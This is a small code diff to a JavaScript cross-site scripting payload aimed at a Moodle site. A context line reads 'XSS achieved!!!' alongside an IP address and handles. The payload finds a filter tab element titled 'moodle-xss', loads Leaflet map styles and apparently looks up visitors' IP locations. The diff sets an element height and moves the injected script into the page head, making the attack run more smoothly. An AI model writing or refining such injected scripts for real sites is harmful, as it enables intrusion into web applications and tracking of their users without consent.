@@ -7,6 +7,8 @@ alert('XSS achieved!!! :3 ~ wntiv_, 162.159.137.232, amsaynz');
   const el = document.querySelector('.filter_generico_tabitem[title*="moodle-xss"]');
   if (!el) return;
 
+  if (!el.style.height) el.style.height = '400px';
+
   const link = document.createElement('link');
   link.rel = 'stylesheet';
   link.href = 'https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.css';
@@ -39,5 +41,5 @@ alert('XSS achieved!!! :3 ~ wntiv_, 162.159.137.232, amsaynz');
       useIP();
     }
   };
-  document.body.appendChild(script);
+  document.head.appendChild(script);
 })();
